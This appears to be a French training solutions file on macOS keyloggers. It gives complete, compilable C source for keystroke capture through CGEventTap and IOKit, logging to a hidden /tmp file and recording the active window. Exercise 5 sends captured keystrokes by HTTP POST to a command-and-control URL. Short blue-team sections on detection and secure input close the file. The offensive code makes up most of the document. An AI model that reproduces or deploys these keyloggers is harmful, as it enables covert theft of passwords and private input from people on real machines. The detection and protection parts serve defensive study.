# SOLUTION : Keylogger macOS

## Exercice 1 : Keylogger basique avec CGEventTap

```c
// keylogger_basic.c
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdio.h>

CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type,
                          CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode
        );

        // Convertir keycode en caractère
        TISInputSourceRef keyboard = TISCopyCurrentKeyboardInputSource();
        CFDataRef layout_data = TISGetInputSourceProperty(
            keyboard, kTISPropertyUnicodeKeyLayoutData
        );

        if (layout_data) {
            const UCKeyboardLayout *keyboard_layout =
                (const UCKeyboardLayout *)CFDataGetBytePtr(layout_data);

            UInt32 dead_key_state = 0;
            UniChar chars[4];
            UniCharCount actual_length;

            UCKeyTranslate(keyboard_layout, keycode,
                          kUCKeyActionDown, 0,
                          LMGetKbdType(), 0,
                          &dead_key_state,
                          sizeof(chars) / sizeof(UniChar),
                          &actual_length, chars);

            if (actual_length > 0) {
                printf("%c", (char)chars[0]);
                fflush(stdout);
            }
        }

        CFRelease(keyboard);
    }

    return event;
}

int main() {
    printf("[*] Starting keylogger...\n");
    printf("[*] Logged keys:\n\n");

    // Créer event tap
    CGEventMask event_mask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        event_mask,
        event_callback,
        NULL
    );

    if (!event_tap) {
        printf("[-] Failed to create event tap\n");
        printf("[-] Need Accessibility permission!\n");
        printf("[-] System Preferences > Security & Privacy > Privacy > Accessibility\n");
        return 1;
    }

    // Créer run loop source
    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, event_tap, 0
    );

    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source,
                      kCFRunLoopCommonModes);

    CGEventTapEnable(event_tap, true);

    printf("[+] Event tap created successfully\n");
    printf("[+] Monitoring keyboard...\n\n");

    CFRunLoopRun();

    return 0;
}
```

**Compilation** :
```bash
clang keylogger_basic.c -o keylogger -framework ApplicationServices -framework Carbon
./keylogger

# Note: Nécessite Accessibility permission
```

---

## Exercice 2 : Keylogger avec logging vers fichier

```c
// keylogger_file.c
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdio.h>
#include <time.h>

FILE *log_file = NULL;

void log_keystroke(char key) {
    if (!log_file) {
        log_file = fopen("/tmp/.keylog.txt", "a");
        if (!log_file) return;
    }

    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    fprintf(log_file, "[%02d:%02d:%02d] %c\n",
            t->tm_hour, t->tm_min, t->tm_sec, key);
    fflush(log_file);
}

CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type,
                          CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode
        );

        TISInputSourceRef keyboard = TISCopyCurrentKeyboardInputSource();
        CFDataRef layout_data = TISGetInputSourceProperty(
            keyboard, kTISPropertyUnicodeKeyLayoutData
        );

        if (layout_data) {
            const UCKeyboardLayout *keyboard_layout =
                (const UCKeyboardLayout *)CFDataGetBytePtr(layout_data);

            UInt32 dead_key_state = 0;
            UniChar chars[4];
            UniCharCount actual_length;

            UCKeyTranslate(keyboard_layout, keycode,
                          kUCKeyActionDown, 0,
                          LMGetKbdType(), 0,
                          &dead_key_state,
                          sizeof(chars) / sizeof(UniChar),
                          &actual_length, chars);

            if (actual_length > 0) {
                char key = (char)chars[0];
                log_keystroke(key);
                printf("%c", key);
                fflush(stdout);
            }
        }

        CFRelease(keyboard);
    }

    return event;
}

int main() {
    printf("[*] Keylogger started - logging to /tmp/.keylog.txt\n");

    CGEventMask event_mask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        event_mask,
        event_callback,
        NULL
    );

    if (!event_tap) {
        printf("[-] Failed to create event tap\n");
        return 1;
    }

    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, event_tap, 0
    );

    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source,
                      kCFRunLoopCommonModes);

    CGEventTapEnable(event_tap, true);

    CFRunLoopRun();

    if (log_file) fclose(log_file);

    return 0;
}
```

---

## Exercice 3 : Keylogger avec context (active window)

```c
// keylogger_context.c
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdio.h>

void log_with_context(char key) {
    // Obtenir l'application active
    NSRunningApplication *active_app = [[NSWorkspace sharedWorkspace]
                                        frontmostApplication];

    NSString *app_name = [active_app localizedName];

    printf("[%s] %c\n", [app_name UTF8String], key);
}

// (Reste du code identique à keylogger_file.c mais avec log_with_context)
```

**Compilation Objective-C** :
```bash
clang -framework ApplicationServices -framework Carbon -framework Cocoa \
    keylogger_context.m -o keylogger_context
```

---

## Exercice 4 : Keylogger IOKit (low-level)

```c
// keylogger_iokit.c
#include <IOKit/IOKitLib.h>
#include <IOKit/hid/IOHIDManager.h>
#include <IOKit/hid/IOHIDKeys.h>
#include <stdio.h>

void input_value_callback(void *context, IOReturn result, void *sender,
                         IOHIDValueRef value) {
    IOHIDElementRef element = IOHIDValueGetElement(value);
    uint32_t usage_page = IOHIDElementGetUsagePage(element);
    uint32_t usage = IOHIDElementGetUsage(element);

    if (usage_page == kHIDPage_KeyboardOrKeypad) {
        CFIndex int_value = IOHIDValueGetIntegerValue(value);

        if (int_value == 1) { // Key pressed
            printf("[KEY] Usage: 0x%02x\n", usage);

            // Map usage to character (simplified)
            if (usage >= 0x04 && usage <= 0x1D) {
                char key = 'a' + (usage - 0x04);
                printf("  -> %c\n", key);
            }
        }
    }
}

int main() {
    IOHIDManagerRef hid_manager = IOHIDManagerCreate(
        kCFAllocatorDefault, kIOHIDOptionsTypeNone
    );

    if (!hid_manager) {
        printf("[-] Failed to create HID manager\n");
        return 1;
    }

    // Matcher pour keyboard
    CFMutableDictionaryRef match_dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks
    );

    int usage_page = kHIDPage_GenericDesktop;
    int usage = kHIDUsage_GD_Keyboard;

    CFNumberRef usage_page_ref = CFNumberCreate(kCFAllocatorDefault,
                                                kCFNumberIntType, &usage_page);
    CFNumberRef usage_ref = CFNumberCreate(kCFAllocatorDefault,
                                          kCFNumberIntType, &usage);

    CFDictionarySetValue(match_dict, CFSTR(kIOHIDDeviceUsagePageKey),
                        usage_page_ref);
    CFDictionarySetValue(match_dict, CFSTR(kIOHIDDeviceUsageKey), usage_ref);

    IOHIDManagerSetDeviceMatching(hid_manager, match_dict);

    // Callback
    IOHIDManagerRegisterInputValueCallback(hid_manager,
                                          input_value_callback, NULL);

    IOHIDManagerScheduleWithRunLoop(hid_manager, CFRunLoopGetCurrent(),
                                   kCFRunLoopDefaultMode);

    IOReturn ret = IOHIDManagerOpen(hid_manager, kIOHIDOptionsTypeNone);

    if (ret != kIOReturnSuccess) {
        printf("[-] Failed to open HID manager: 0x%08x\n", ret);
        printf("[-] Need root or special entitlements\n");
        return 1;
    }

    printf("[+] Monitoring HID keyboard events...\n");

    CFRunLoopRun();

    CFRelease(match_dict);
    CFRelease(usage_page_ref);
    CFRelease(usage_ref);
    IOHIDManagerClose(hid_manager, kIOHIDOptionsTypeNone);
    CFRelease(hid_manager);

    return 0;
}
```

**Compilation** :
```bash
clang keylogger_iokit.c -o keylogger_iokit -framework IOKit -framework CoreFoundation
sudo ./keylogger_iokit  # Nécessite root
```

---

## Exercice 5 : Keylogger avec exfiltration C2

```c
// keylogger_c2.c
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>

#define C2_URL "http://c2-server.com/keylog"
#define BUFFER_SIZE 1024

char key_buffer[BUFFER_SIZE];
int buffer_pos = 0;

void exfiltrate_keys() {
    if (buffer_pos == 0) return;

    CURL *curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, key_buffer);

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("\n[+] Keys exfiltrated (%d chars)\n", buffer_pos);
        memset(key_buffer, 0, BUFFER_SIZE);
        buffer_pos = 0;
    }

    curl_easy_cleanup(curl);
}

void add_to_buffer(char key) {
    if (buffer_pos < BUFFER_SIZE - 1) {
        key_buffer[buffer_pos++] = key;
        key_buffer[buffer_pos] = '\0';

        // Exfiltrer toutes les 100 touches ou newline
        if (buffer_pos >= 100 || key == '\n') {
            exfiltrate_keys();
        }
    }
}

CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type,
                          CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode
        );

        TISInputSourceRef keyboard = TISCopyCurrentKeyboardInputSource();
        CFDataRef layout_data = TISGetInputSourceProperty(
            keyboard, kTISPropertyUnicodeKeyLayoutData
        );

        if (layout_data) {
            const UCKeyboardLayout *keyboard_layout =
                (const UCKeyboardLayout *)CFDataGetBytePtr(layout_data);

            UInt32 dead_key_state = 0;
            UniChar chars[4];
            UniCharCount actual_length;

            UCKeyTranslate(keyboard_layout, keycode,
                          kUCKeyActionDown, 0,
                          LMGetKbdType(), 0,
                          &dead_key_state,
                          sizeof(chars) / sizeof(UniChar),
                          &actual_length, chars);

            if (actual_length > 0) {
                add_to_buffer((char)chars[0]);
            }
        }

        CFRelease(keyboard);
    }

    return event;
}

int main() {
    printf("[*] Keylogger with C2 exfiltration\n");

    CGEventMask event_mask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        event_mask,
        event_callback,
        NULL
    );

    if (!event_tap) {
        printf("[-] Failed to create event tap\n");
        return 1;
    }

    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, event_tap, 0
    );

    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source,
                      kCFRunLoopCommonModes);

    CGEventTapEnable(event_tap, true);

    CFRunLoopRun();

    return 0;
}
```

---

## Exercice 6 : Détecter keyloggers (Blue Team)

```bash
# Lister processus avec event tap
lsof | grep "event tap"

# Vérifier apps avec Accessibility permission
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceAccessibility';"

# Monitoring
log stream --predicate 'eventMessage contains "CGEventTap"' --level debug
```

**Code de détection** :

```c
// detect_keylogger.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Chercher processus suspects
    FILE *fp = popen("ps aux | grep -i 'keylog\\|logger' | grep -v grep", "r");

    if (fp) {
        char buffer[256];
        int found = 0;

        while (fgets(buffer, sizeof(buffer), fp)) {
            printf("[!] Suspicious process: %s", buffer);
            found = 1;
        }

        pclose(fp);

        if (found) {
            printf("\n[!] ALERT: Potential keylogger detected!\n");
        }
    }

    return 0;
}
```

---

## Exercice 7 : Protection contre keyloggers

```bash
# 1. Désactiver Accessibility pour apps non fiables
# System Preferences > Security & Privacy > Privacy > Accessibility

# 2. Monitoring TCC
log stream --predicate 'subsystem == "com.apple.TCC"' --level debug

# 3. Secure input (pour apps sensibles)
# Utilise SecureEventInput API
```

**Code protection** :

```c
#include <Carbon/Carbon.h>

void enable_secure_input() {
    EnableSecureEventInput();
    // Empêche event taps de lire ce qu'on tape
}

void disable_secure_input() {
    DisableSecureEventInput();
}
```

---

## Resources

- [CGEventTap](https://developer.apple.com/documentation/coregraphics/1454426-cgeventtapcreate)
- [IOKit HID](https://developer.apple.com/documentation/iokit/hid_class_device_interface_guide)
- [TCC Database](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [Keylogger Detection](https://objective-see.com/products/reikey.html)
